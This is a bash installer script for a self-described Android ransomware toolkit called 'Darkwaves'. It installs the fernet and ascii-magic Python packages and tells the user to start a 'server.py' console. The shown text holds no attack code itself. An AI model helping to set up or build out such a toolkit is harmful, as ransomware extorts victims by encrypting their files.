#! /usr/bin/bash
null="> /dev/null 2>&1"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
w="\033[0m"
echo -e $b">"$w" Darkwaves - Simple android ransomware attack"
echo -e $b">"$w" prepare for installing dependencies ..."
sleep 3
echo -e $b">"$w" installing package: "$g"fernet"$w
pip install fernet
echo -e $b">"$w" installing package: "$g"ascii-magic"$w
pip install ascii-magic
echo -e $b">"$w" successfully installing dependencies"
echo -e $b">"$w" use command "$g"python3 server.py"$w" for start the console"


